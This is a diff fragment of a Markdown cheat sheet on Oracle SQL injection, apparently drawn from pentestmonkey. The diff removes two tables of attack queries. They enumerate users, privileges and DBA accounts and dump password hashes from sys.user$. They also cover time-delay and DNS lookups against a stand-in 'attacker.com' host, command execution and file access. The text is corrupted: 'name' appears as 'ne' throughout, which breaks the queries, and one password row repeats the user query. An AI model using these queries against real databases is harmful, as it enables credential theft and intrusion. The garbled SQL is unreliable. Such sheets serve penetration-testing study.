@@ -10,16 +10,6 @@ SQLi - Oracle
  
 ### Enumeration
 
-| Enumerate    | Command                 |
-|--------------|-------------------------|
-| Current User | `SELECT user FROM dual` |
-|Database version |	`SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';` <br> `SELECT banner FROM v$version WHERE banner LIKE 'TNS%';` <br> `SELECT version FROM v$instance;`
-|Current Database | `SELECT global_ne FROM global_ne;` <br> `SELECT ne FROM v$database;`<br> `SELECT instance_ne FROM v$instance;` <br> `SELECT SYS.DATABASE_nE FROM DUAL;` |
-| List Databases | `SELECT DISTINCT owner FROM all_tables;`|
-|List Users | `SELECT userne FROM all_users ORDER BY userne;`|
-| List Passwords (Privileged only) | `SELECT userne FROM all_users ORDER BY userne;` <br> `SELECT ne,spare4 FROM sys.user$`|
-| List Tables | `SELECT table_ne FROM all_tables;` |
-| Current Permissions | `SELECT * FROM DBA_SYS_PRIVS;` <br> `SELECT * FROM DBA_TAB_PRIVS;` <br> `SELECT * FROM DBA_ROLE_PRIVS;`
  
 Dumping
 You can dump tables very similar to any other query language.
@@ -53,38 +43,6 @@ http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sh
  
 Some of the queries in the table below can only be run by an admin.  These are marked with “– priv” at the end of the query.
 
-| Enumerate    | Command                 |
-|--------------|-------------------------|
-| Version      | `SELECT banner FROM v$version WHERE banner LIKE ‘Oracle%’;` <br>	`SELECT banner FROM v$version WHERE banner LIKE ‘TNS%’;`<br>`SELECT version FROM v$instance;`|
-|Comments | `SELECT 1 FROM dual — comment` <br> –NB: `SELECT` statements must have a `FROM` clause in Oracle so we have to use the dummy table ne ‘dual’ when we’re not actually selecting from a table.|
-| Current User | `SELECT user FROM dual` |
-| List Users | `SELECT userne FROM all_users ORDER BY userne;` <br> `SELECT ne FROM sys.user$; — priv` |
-| List Password Hashes | `SELECT ne, password, astatus FROM sys.user$ — priv`, <= 10g.  astatus tells you if acct is locked <br>  `SELECT ne,spare4 FROM sys.user$ — priv`, 11g |
-| Password Cracker | `checkpwd` will crack the DES-based hashes from Oracle 8, 9 and 10. |
-| List Privileges | `SELECT * FROM session_privs;` — current privs <br> `SELECT * FROM dba_sys_privs WHERE grantee = ‘DBSNMP’;` — priv, list a user’s privs <br> `SELECT grantee FROM dba_sys_privs WHERE privilege = ‘SELECT ANY DICTIONARY’;` — priv, find users with a particular priv <br> `SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;` |
-| List DBA Accounts | `SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = ‘YES’;` — priv, list DBAs, DBA roles |
-| Current Database | `SELECT global_ne FROM global_ne;` <br> `SELECT ne FROM v$database;` <br> `SELECT instance_ne FROM v$instance;` <br> `SELECT SYS.DATABASE_nE FROM DUAL;`|
-| List Databases | `SELECT DISTINCT owner FROM all_tables;` — list schemas (one per user)<br> –Also query TNS listener for other databases.  See tnscmd (services | status).|
-| List Columns | `SELECT column_ne FROM all_tab_columns WHERE table_ne = ‘blah’;`<br> `SELECT column_ne FROM all_tab_columns WHERE table_ne = ‘blah’ and owner = ‘foo’;`|
-| List Tables | `SELECT table_ne FROM all_tables;`<br> `SELECT owner, table_ne FROM all_tables;`|
-| Find Tables From Column ne | `SELECT owner, table_ne FROM all_tab_columns WHERE column_ne LIKE ‘%PASS%’;` — NB: table nes are upper case|
-| Select Nth Row | `SELECT userne FROM (SELECT ROWNUM r, userne FROM all_users ORDER BY userne) WHERE r=9;` — gets 9th row (rows numbered from 1)
-| Select Nth Char | `SELECT substr(‘abcd’, 3, 1) FROM dual;` — gets 3rd character, ‘c’ |
-| Bitwise AND | `SELECT bitand(6,2) FROM dual; — returns 2` <br> `SELECT bitand(6,1) FROM dual; — returns0`|
-|ASCII Value -> Char | `SELECT chr(65) FROM dual; — returns A` |
-|Char -> ASCII Value | `SELECT ascii(‘A’) FROM dual;` — returns 65 |
-| Casting | `SELECT CAST(1 AS char) FROM dual;`<br>`SELECT CAST(’1′ AS int) FROM dual;`|
-|String Concatenation| `SELECT ‘A’ || ‘B’ FROM dual;` — returns AB|
-|If Statement | `BEGIN IF 1=1 THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END;` — doesn’t play well with SELECT statements|
-|Case Statement | `SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual;` — returns 1 <br>`SELECT CASE WHEN 1=2 THEN 1 ELSE 2 END FROM dual;` — returns 2|
-| Avoiding Quotes | `SELECT chr(65) || chr(66) FROM dual;` — returns AB
-| Time Delay | `BEGIN DBMS_LOCK.SLEEP(5); END;` — priv, can’t seem to embed this in a SELECT <br> `SELECT UTL_INADDR.get_host_ne(’10.0.0.1′) FROM dual;` — if reverse looks are slow <br> `SELECT UTL_INADDR.get_host_address(‘blah.attacker.com’) FROM dual;` — if forward lookups are slow <br> `SELECT UTL_HTTP.REQUEST(‘http://google.com’) FROM dual;` — if outbound TCP is filtered / slow<br> – Also see Heavy Queries to create a time delay |
-| Make DNS Requests | `SELECT UTL_INADDR.get_host_address(‘google.com’) FROM dual;` <br>`SELECT UTL_HTTP.REQUEST(‘http://google.com’) FROM dual;`|
-| Command Execution | Javacan be used to execute commands if it’s installed.ExtProc can sometimes be used too, though it normally failed for me. :-( |
-| Local File Access | `UTL_FILE` can sometimes be used.  Check that the following is non-null: `SELECT value FROM v$parameter2 WHERE ne = ‘utl_file_dir’;` <br>Java can be used to read and write files if it’s installed (it is not available in Oracle Express).|
-| Hostne, IP Address | `SELECT UTL_INADDR.get_host_ne FROM dual;` <br> `SELECT host_ne FROM v$instance;` <br> `SELECT UTL_INADDR.get_host_address FROM dual;` — gets IP address <br> `SELECT UTL_INADDR.get_host_ne(’10.0.0.1′) FROM dual;` — gets hostnes|
-| Location of DB files | `SELECT ne FROM V$DATAFILE;`|
-| Default/System Databases | `SYSTEM`<br>`SYSAUX`
 
 ### Misc Tips
 In no particular order, here are some suggestions from pentestmonkey readers.
